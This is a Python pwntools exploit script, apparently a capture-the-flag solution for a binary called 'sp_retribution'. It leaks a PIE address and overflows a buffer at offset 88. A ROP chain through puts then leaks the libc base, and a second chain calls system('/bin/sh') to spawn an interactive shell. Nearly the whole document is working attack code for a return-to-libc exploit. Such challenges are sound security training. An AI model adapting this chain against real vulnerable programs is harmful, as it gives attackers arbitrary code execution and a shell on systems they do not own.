#!/usr/bin/python3

from pwn import *

payload = cyclic(200)
exe = ELF('./sp_retribution')
libc = ELF('./glibc/libc.so.6')

context.binary = exe
offset = 88
pop_rdi = 0x0000000000000d33 #: pop rdi; ret;
def pwn():
    print("[" '\033[94m' "*" '\033[0m' "] Launching the exploit...")

    binary = process(exe.path)

    #gdb.attach(binary, gdbscript='''
    #init-peda
    #b *missile_launcher+117
    #b *missile_launcher+163
    #continue
    #''')

    binary.sendlineafter(b'>>', b'2')

    binary.send(b'A'*8)
    binary.recvuntil(b'A'*8)
    leak = binary.recvuntil(b'\n', drop=True)
    print("[" '\033[94m' "*" '\033[0m' "] Leak:", str(leak))
    exe.address = u64(leak.ljust(8, b'\x00')) - 0xd70
    info("Pie base:%#x", exe.address)

    #Get libc leak from got.puts
    rop = ROP(exe)
    rop.puts(exe.got.puts)
    rop.missile_launcher()

    binary.sendlineafter(b': ', flat({offset: rop.chain()}))

    binary.recvuntil(b'34m\n')
    leak = binary.recvuntil(b'\n\n', drop=True)
    libc.address = u64(leak.ljust(8, b'\x00')) - 0x6f6a0
    info("Libc base:%#x", libc.address)

    binary.send(b'A')

    rop = ROP(libc)
    rop.system(next(libc.search(b'/bin/sh\x00')))
    binary.sendlineafter(b': ', flat({offset: rop.chain()}))

    binary.interactive()


if __name__ == "__main__":
    pwn()